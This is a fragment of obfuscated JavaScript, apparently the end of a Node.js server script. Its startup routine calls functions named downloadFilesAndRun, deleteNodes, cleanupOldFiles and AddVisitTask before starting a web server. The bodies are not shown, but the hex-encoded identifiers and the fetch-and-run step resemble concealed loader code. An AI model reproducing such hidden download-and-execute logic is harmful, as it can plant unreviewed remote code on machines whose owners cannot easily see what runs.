_0x4d233b=_0x13cf94;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x33f0e2){console[_0x4d233b(0x159)](_0x4d233b(0x181),_0x33f0e2);}}startserver()['catch'](_0x56ebc1=>{const _0x4dc768=_0x13cf94;console[_0x4dc768(0x159)]('Unhandled\x20error\x20in\x20startserver:',_0x56ebc1);}),app[_0x13cf94(0x1e5)](PORT,()=>console[_0x13cf94(0x1c8)](_0x13cf94(0x12f)+PORT+'!'));
